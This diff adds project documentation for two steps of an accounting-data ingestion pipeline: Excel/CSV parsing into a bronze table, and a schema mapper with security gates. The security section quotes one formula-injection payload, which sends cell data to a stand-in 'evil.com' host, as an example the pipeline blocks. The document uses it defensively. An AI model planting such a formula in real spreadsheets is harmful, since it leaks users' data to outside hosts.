@@ -867,3 +867,619 @@ row of the detected file into the `bronze_transactions` table. This includes:
 - Setting `processing_status = 'pending'` for every row
 
 The Bronze Writer is the first step that actually touches the file contents.
+
+# Neural Ledger — Step 3: Bronze Writer
+
+## Overview
+
+Step 3 is the first point where Neural Ledger actually opens a financial file
+and reads its contents. The Bronze Writer takes a file queued by the File
+Watcher (Step 2), parses every row, and writes it into the `bronze_transactions`
+table exactly as provided — original column names, original values, nothing
+changed.
+
+Bronze is the memory of the system. Every file the accountant ever drops is
+preserved here permanently. Even if the normalization engine in Silver makes a
+mistake, the original data is always recoverable from Bronze.
+
+---
+
+## Files Created
+
+```
+neural_ledger/
+├── src/
+│   └── phase1/
+│       ├── ingestion/
+│       │   ├── excel_parser.py     # Excel (.xlsx/.xls) parser
+│       │   └── csv_parser.py       # CSV parser with encoding detection
+│       └── bronze/
+│           ├── __init__.py
+│           └── bronze_writer.py    # Main Bronze ingestion orchestrator
+└── tests/
+    └── phase1/
+        └── test_bronze_writer.py   # 33 tests — all passing
+```
+
+---
+
+## The Core Challenge: Real-World Accounting Files Are Messy
+
+Pakistani accountant Excel files are not clean, structured tables. Before
+writing any parser, the team studied the actual files accountants produce.
+Here is what the parsers handle:
+
+### Excel Challenges Solved
+
+**Multiple title rows before the real headers**
+An Excel file from a Pakistani accountant typically looks like:
+```
+Row 1: ABC Trading Company (Pvt) Ltd        ← company name
+Row 2: Cash Book — January 2024             ← report title
+Row 3: (blank)                              ← visual space
+Row 4: Date | Particulars | Dr | Cr | Bal  ← REAL headers
+Row 5: 01/01/2024 | Opening Balance | ...   ← data starts
+```
+The header detection algorithm scans the first 15 rows and identifies the
+first row that looks like column headers (mostly string values, not numbers
+or dates). This finds row 4 and ignores the title rows completely.
+
+**Dr/Cr split columns**
+Standard accounting format uses separate Debit and Credit columns instead
+of a single net amount. Both columns are preserved as-is in Bronze. The
+normalization engine in Silver handles the Dr/Cr to net_amount conversion.
+
+**Urdu and mixed-language headers**
+`تاریخ` (date), `رقم` (amount), `تفصیل` (description) are common column
+names in Pakistani accountant files. The parser uses Unicode-aware handling
+to preserve these exactly. The `language_detected` field in Silver will be
+set to `ur` or `mixed` accordingly.
+
+**Blank rows used as visual separators**
+Accountants add blank rows between sections. These are detected and removed
+before writing to Bronze.
+
+**Multiple sheets**
+Excel files often have a Summary sheet and a Transactions sheet. The parser
+picks the sheet with the most data automatically.
+
+**Merged cells in headers**
+The openpyxl engine handles merged cell ranges. Missing values in merged
+ranges are forward-filled to reconstruct the full header.
+
+### CSV Challenges Solved
+
+**Encoding detection**
+Pakistani Windows machines produce CSV files in Windows-1252 encoding by
+default. `chardet` detects the encoding automatically with confidence scoring.
+If confidence is below 80%, it defaults to `utf-8-sig` (handles Windows BOM).
+
+Encoding fallback chain (tried in order if detection fails):
+1. `utf-8-sig` — UTF-8 with BOM (Excel "Save as CSV" on Windows)
+2. `utf-8` — standard
+3. `cp1252` — Windows-1252 (most Windows CSV exports)
+4. `latin-1` — accepts all byte values (absolute last resort)
+
+**Delimiter detection**
+Uses Python's `csv.Sniffer` first, then frequency analysis. Handles comma,
+tab, semicolon, and pipe-delimited files. Semicolon is common from Tally
+and other European-origin accounting software.
+
+**BOM characters**
+Files saved from Windows Excel with "UTF-8 (BOM)" encoding have an invisible
+BOM character at the start. Without handling, this appears in the first column
+name as `\ufeffDate`. The `utf-8-sig` codec strips it automatically.
+
+**Total and summary rows**
+CSV exports from accounting software often include total rows at the bottom:
+`Total, 500000, ,`. These are detected by checking if the first column value
+matches known total keywords (including Urdu `kul`, `majmua`) and skipped.
+
+---
+
+## Architecture
+
+### Component 1: ExcelParser
+
+```python
+from src.phase1.ingestion.excel_parser import ExcelParser
+
+parser = ExcelParser()
+rows, headers, meta = parser.parse("sales_jan.xlsx")
+
+# rows: list of dicts with original column names
+# [{"Date": "15/01/2024", "Vendor": "Shell", "Amount": "5000"}, ...]
+
+# headers: original column names in order
+# ["Date", "Vendor", "Amount"]
+
+# meta: parsing information
+# {"sheet_name": "Transactions", "header_row": 3, "total_rows": 45, ...}
+```
+
+**Header detection strategy:**
+1. Load with openpyxl (read_only=True for speed)
+2. Scan first 15 rows
+3. Find first row where ≥50% of non-empty cells are strings
+4. Use that row index as the `header=` parameter for pandas
+
+**Sheet selection strategy:**
+Count non-empty rows in each sheet (up to 200 rows scan).
+Pick the sheet with the most data.
+
+### Component 2: CSVParser
+
+```python
+from src.phase1.ingestion.csv_parser import CSVParser
+
+parser = CSVParser()
+rows, headers, meta = parser.parse("transactions.csv")
+
+# meta includes detected encoding and delimiter
+# {"encoding": "cp1252", "encoding_confidence": 0.95, "delimiter": ",", ...}
+```
+
+### Component 3: BronzeWriter
+
+```python
+from src.phase1.bronze.bronze_writer import BronzeWriter
+
+writer = BronzeWriter()
+
+# metadata comes directly from FileProcessor (Step 2)
+result = writer.ingest({
+    "file_path":       "/path/to/data_vault/sales_jan.xlsx",
+    "file_name":       "sales_jan.xlsx",
+    "source_type":     "xlsx",
+    "source_software": "manual_excel",
+    "detection_conf":  0.85,
+    "file_hash":       "a3f8c2...",
+    "file_size_bytes": 24576,
+    "detected_at":     "2024-01-15T14:30:00",
+})
+
+print(result)
+# {
+#     "success":      True,
+#     "rows_written": 45,
+#     "batch_id":     "f3a1c2d4-...",
+#     "error":        None,
+#     "parse_meta":   {"total_rows": 45, "total_cols": 5, ...}
+# }
+```
+
+---
+
+## What Gets Written to Bronze
+
+Each row in `bronze_transactions` contains:
+
+| Field | What it stores |
+|---|---|
+| `bronze_id` | Auto-generated UUID |
+| `source_type` | `xlsx` or `csv` |
+| `source_software` | `manual_excel`, `tally`, `quickbooks_desktop`, etc. |
+| `source_file` | Original filename |
+| `source_file_hash` | SHA256 — same as Step 2 duplicate detection |
+| `source_row_number` | Row number in original file (1-based) |
+| `raw_content` | **The original row as JSON** — original column names preserved |
+| `raw_headers` | **All original column headers** from the file |
+| `ingestion_batch_id` | UUID grouping all rows from this one file |
+| `processing_status` | Always `pending` — Silver picks these up next |
+| `ingested_at` | Timestamp |
+
+### Example `raw_content` for a Tally export row:
+```json
+{
+    "Date": "15/01/2024",
+    "Particulars": "Shell Clifton",
+    "Vch Type": "Payment",
+    "Vch No.": "PV-001",
+    "Debit": "5000",
+    "Credit": null
+}
+```
+
+### Example `raw_content` for a manual Urdu Excel row:
+```json
+{
+    "تاریخ": "15/01/2024",
+    "رقم": "5000",
+    "تفصیل": "Petrol purchase",
+    "Vendor": "Shell"
+}
+```
+
+Both rows have `processing_status = 'pending'`. The Silver normalization engine
+reads both and applies different mapping strategies based on `source_software`.
+
+---
+
+## Pipeline Integration
+
+Step 3 connects directly to Steps 2 and 4:
+
+```
+Step 2 (File Watcher)
+    FileProcessor detects file → produces metadata dict
+            ↓
+Step 3 (Bronze Writer)
+    BronzeWriter.ingest(metadata) → writes to bronze_transactions
+            ↓
+Step 4 (Schema Mapper — coming next)
+    Reads bronze rows with status='pending'
+    Maps original column names to standard schema
+    Writes to silver_transactions
+```
+
+To connect Steps 2 and 3 in the pipeline:
+
+```python
+from src.phase1.watcher import DataVaultWatcher
+from src.phase1.bronze.bronze_writer import BronzeWriter
+
+writer = BronzeWriter()
+
+watcher = DataVaultWatcher(
+    vault_path="data_vault/",
+    on_file_ready=writer.ingest,   # Step 2 calls Step 3 directly
+)
+watcher.start()
+watcher.scan_existing()
+```
+
+---
+
+## Test Coverage
+
+**33 tests — all passing.**
+
+```bash
+python -m pytest tests/phase1/test_bronze_writer.py -v
+```
+
+| Test Class | Count | What It Tests |
+|---|---|---|
+| `TestExcelParser` | 10 | Clean files, title rows, Dr/Cr, Urdu headers, blank rows, multiple sheets, empty columns |
+| `TestCSVParser` | 9 | UTF-8, Windows-1252, BOM, semicolons, tabs, blank rows, total rows, whitespace |
+| `TestBronzeWriter` | 14 | Excel ingest, CSV ingest, raw_content integrity, source_software, pending status, batch IDs, Urdu headers, file hash, row numbers, audit log |
+
+---
+
+## Setup for Step 3
+
+### Install new dependencies
+
+```bash
+pip install pandas openpyxl xlrd chardet
+```
+
+### Updated requirements.txt
+
+```
+duckdb
+python-dotenv
+pytest
+watchdog
+pandas
+openpyxl
+xlrd
+chardet
+```
+
+### New folder to create
+
+Create `src/phase1/bronze/` and add an empty `__init__.py` inside it.
+
+### Run the tests
+
+```bash
+python -m pytest tests/phase1/test_bronze_writer.py -v
+```
+
+### Try it end-to-end
+
+Create `run_pipeline.py` in project root:
+
+```python
+import sys, time
+sys.path.insert(0, '.')
+
+from src.database.init_db import db
+from src.phase1.watcher import DataVaultWatcher
+from src.phase1.bronze.bronze_writer import BronzeWriter
+
+db.initialise()
+writer = BronzeWriter()
+
+def on_file_ready(metadata):
+    print(f"\n[INGESTING] {metadata['file_name']}")
+    result = writer.ingest(metadata)
+    if result["success"]:
+        print(f"  Written: {result['rows_written']} rows to Bronze")
+        print(f"  Batch:   {result['batch_id'][:8]}")
+    else:
+        print(f"  Failed:  {result['error']}")
+
+    # Show Bronze stats
+    stats = db.get_schema_stats()
+    print(f"  Bronze total: {stats['bronze_transactions']} rows")
+
+watcher = DataVaultWatcher(vault_path="data_vault/", on_file_ready=on_file_ready)
+watcher.start()
+watcher.scan_existing()
+
+print("Drop Excel or CSV files into data_vault/ — Ctrl+C to stop")
+try:
+    while True:
+        time.sleep(1)
+except KeyboardInterrupt:
+    watcher.stop()
+```
+
+```bash
+python run_pipeline.py
+```
+
+Drop any Excel or CSV file into `data_vault/`. You will see it ingested and
+the Bronze row count increase in real time.
+
+---
+
+## Design Decisions
+
+**Why openpyxl for header detection and pandas for data reading?**
+openpyxl gives fine-grained control over individual cells and merged cell
+ranges — essential for detecting where the real headers are. Once the header
+row is identified, pandas handles the bulk data reading efficiently (much
+faster than iterating rows with openpyxl for large files).
+
+**Why `dtype=str` when reading with pandas?**
+If pandas infers types, it converts `"01/01/2024"` to a Timestamp object and
+`"5000"` to an integer. This destroys the original values. By reading
+everything as string, Bronze stores exactly what the accountant typed.
+Type inference happens in Silver — not in Bronze.
+
+**Why JSON for `raw_content`?**
+A flexible JSON blob means Bronze can accept any file structure without
+schema changes. A file with 3 columns and a file with 15 columns both fit
+in the same table. The Silver normalization engine reads the JSON and maps
+whatever columns exist to the standard schema.
+
+**Why `ensure_ascii=False` in JSON serialization?**
+Without this flag, Urdu text like `تاریخ` would be stored as
+`\u062a\u0627\u0631\u06cc\u062e`. With `ensure_ascii=False`, it is stored
+as readable Unicode text. This makes debugging and manual inspection vastly
+easier.
+
+**Why `source_row_number` (1-based)?**
+When an accountant reports "row 47 of my Excel has an error," they count
+from row 1. Storing 1-based row numbers means the audit trail speaks the
+same language as the accountant.
+
+---
+
+## What Comes Next
+
+**Step 4 — Schema Mapper (Silver Layer)**
+
+The Schema Mapper reads Bronze rows with `processing_status = 'pending'`.
+For each row, it:
+1. Looks up the `source_software` in `bronze_schema_mappings`
+2. Maps original column names to the Neural Ledger standard schema
+3. Handles Dr/Cr split columns, date format detection, amount parsing
+4. Writes the normalized row to `silver_transactions`
+5. Updates `bronze_transactions.processing_status = 'normalised'`
+
+This is where `Taareekh` becomes `transaction_date` and `Raqam` becomes
+`net_amount`.
+
+
+# Neural Ledger — Step 4: Schema Mapper
+
+## Overview
+
+The Schema Mapper is the intelligence layer between Bronze and Silver. It solves
+the hardest problem in the entire ingestion pipeline: Pakistani accountants use
+wildly different column names for the same financial data. This step maps every
+incoming column name — regardless of language, software, or personal convention —
+to the Neural Ledger standard schema.
+
+---
+
+## Files Created
+
+```
+neural_ledger/
+├── src/
+│   └── phase1/
+│       └── schema_mapper/
+│           ├── __init__.py
+│           ├── dictionary.py    # Pakistani column knowledge base (4a)
+│           ├── fuzzy_mapper.py  # Layers 1+2 fuzzy matching (4b)
+│           ├── security.py      # 7 security gates (4c)
+│           └── mapper.py        # Orchestrator (4d)
+└── tests/
+    └── phase1/
+        └── test_schema_mapper.py   # 59 tests — all passing
+```
+
+---
+
+## The Four-Layer Hybrid Strategy
+
+```
+COLUMN ARRIVES FROM BRONZE
+        ↓
+LAYER 1 — Known mapping lookup
+  Check bronze_schema_mappings for this software
+  If user-confirmed → confidence 1.0 → auto-map
+  If confidence ≥ 0.85 → auto-map silently
+        ↓ (unresolved columns)
+LAYER 2 — Fuzzy rule-based matching
+  Exact case-insensitive → confidence 0.95
+  Normalized match (strip spaces/punctuation) → 0.85
+  N-gram fuzzy similarity → proportional
+  Substring match → 0.70
+        ↓ (still below threshold)
+LAYER 3 — LLM assist
+  Headers + 2 sanitized sample rows → Groq
+  PII masked before sending
+  Output validated by Gate 6
+        ↓ (still unresolved)
+LAYER 4 — User confirmation
+  Flagged in needs_user_review
+  User confirms once → saved to DB forever
+```
+
+---
+
+## The Dictionary (4a)
+
+The dictionary covers:
+
+**Software-specific exact mappings** (confidence 0.95) for:
+Tally/TallyPrime, QuickBooks Desktop, QuickBooks Online, LedgerMax,
+Xero, Odoo/ERPNext, Sage 50, Moneypex, all Pakistani bank PDFs
+(HBL, UBL, Alfalah, Meezan, NBP).
+
+**General mappings** (confidence 0.80) — 100+ common column name
+variations across all software.
+
+**Urdu mappings** (confidence 0.90) — both Unicode Urdu script
+(تاریخ, رقم, تفصیل) and Roman Urdu (Taareekh, Raqam, Tafseelat).
+
+**Abbreviation mappings** (confidence 0.70) — Dr, Cr, Dt, Amt, Ref, etc.
+
+**FBR tax category mappings** — maps transaction categories to FBR
+sections for compliance signal generation. Includes WHT rates for
+salary (149), services (153), supplies (153), rent (155), dividends (150).
+
+**Transaction type normalization** — maps Payment/BP/CP/Bhugtan all
+to "payment", JV/Journal Voucher/J/V all to "journal", etc.
+
+---
+
+## The Security Layer (4c)
+
+Seven gates protect the pipeline:
+
+| Gate | Timing | What it prevents |
+|---|---|---|
+| 1. File size check | Pre-mapping | DoS via huge files |
+| 2. Row count check | Pre-mapping | Memory exhaustion |
+| 3. Formula neutralization | Pre-mapping | Excel/CSV injection attacks |
+| 4. Reserved name protection | Pre-mapping | Schema confusion attacks |
+| 5. Unicode normalization | Pre-mapping | Encoding bypass attacks |
+| 6. LLM output validation | Post-LLM | Prompt injection via LLM response |
+| 7. Output sanitization | Post-mapping | Type coercion, amount parsing |
+
+**Formula injection example blocked:**
+A malicious cell value `=HYPERLINK("evil.com?data="&A1,"Click")` is
+detected by Gate 3 and stored as `FORMULA_REMOVED:=HYPERLINK(...)` — never
+executed, fully auditable.
+
+**Reserved name example blocked:**
+If an incoming file has a column called `quality_score` (an internal
+Neural Ledger field), Gate 4 renames it to `raw_quality_score` before
+any mapping happens. The schema contract cannot be violated.
+
+**Amount parsing Gate 7 handles:**
+- `"PKR 45,000"` → `45000.0`
+- `"Rs. 12,500.50"` → `12500.5`
+- `"(5,000)"` → `-5000.0` (accountant convention for negatives)
+- `"N/A"` → `None`
+
+---
+
+## Privacy in LLM Layer
+
+The LLM (Groq) receives only:
+- Column header names
+- Up to 2 sample cell values per column (truncated to 50 chars)
+- PII patterns masked: phone numbers → `[PHONE]`, NTN → `[NTN]`,
+  CNIC → `[CNIC]`, bank accounts → `[ACCOUNT]`
+
+The LLM never sees: actual transaction amounts, vendor names beyond
+the 2 sample rows, any personally identifiable information.
+
+---
+
+## Usage
+
+```python
+from src.phase1.schema_mapper.mapper import SchemaMapper
+
+mapper = SchemaMapper()
+
+result = mapper.map(
+    columns=["Taareekh", "Raqam", "Tafseelat", "Vendor Name"],
+    rows=rows,              # raw row dicts from Bronze
+    source_software="manual_excel",
+    batch_id="abc-123",
+    file_size_bytes=24576,
+)
+
+print(result.column_mapping)
+# {
+#   "Taareekh":    "transaction_date",
+#   "Raqam":       "net_amount",
+#   "Tafseelat":   "description",
+#   "Vendor Name": "vendor",
+# }
+
+print(result.coverage)         # 1.0 — all columns mapped
+print(result.has_date)         # True
+print(result.has_amount)       # True
+print(result.needs_user_review) # [] — nothing needed
+print(result.security_warnings) # [] — no issues
+```
+
+---
+
+## Test Coverage
+
+**59 tests — all passing.**
+
+```bash
+python -m pytest tests/phase1/test_schema_mapper.py -v
+```
+
+| Class | Tests | Coverage |
+|---|---|---|
+| `TestDictionary` | 15 | All software mappings, Urdu, reserved names, FBR, tx types |
+| `TestFuzzyMapper` | 17 | Tally, QuickBooks, LedgerMax, Urdu, abbreviations, edge cases |
+| `TestSecurity` | 19 | All 7 gates, formula injection, amount parsing, LLM validation |
+| `TestSchemaMapperIntegration` | 6 | End-to-end Tally, manual Excel, formula attack, reserved names |
+
+---
+
+## Setup
+
+### Install dependencies (no new ones required for Step 4)
+All dependencies were already installed in Steps 2 and 3.
+
+### Add the new files
+```
+src/phase1/schema_mapper/__init__.py    (empty)
+src/phase1/schema_mapper/dictionary.py
+src/phase1/schema_mapper/fuzzy_mapper.py
+src/phase1/schema_mapper/security.py
+src/phase1/schema_mapper/mapper.py
+tests/phase1/test_schema_mapper.py
+```
+
+### Run tests
+```bash
+python -m pytest tests/phase1/test_schema_mapper.py -v
+```
+
+---
+
+## What Comes Next
+
+**Step 5 — Silver Writer + Normalization Engine**
+
+Reads Bronze rows with `processing_status = 'pending'`, applies the
+column mapping from Step 4, normalizes dates and amounts, detects
+language, deduplicates, masks PII, and writes to `silver_transactions`.
